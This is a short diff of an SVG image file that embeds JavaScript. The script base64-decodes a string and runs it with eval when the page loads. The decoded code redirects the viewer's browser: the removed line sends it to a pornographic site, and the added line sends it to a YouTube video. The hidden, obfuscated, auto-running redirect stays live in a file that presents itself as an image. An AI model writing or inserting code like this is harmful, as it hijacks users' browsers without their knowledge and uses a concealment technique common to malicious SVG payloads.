@@ -2,9 +2,10 @@
     <script type="text/javascript">
         <![CDATA[
         document.addEventListener("DOMContentLoaded", function() {
-            var script = atob("d2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly9wb3JuaHViLmNvbSI7");
+            var script = atob("d2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1YQmt6QnJYbGxlMCZ0PTQ2cyI7");
             eval(script);
         });
         ]]>
     </script>
 </svg>
+
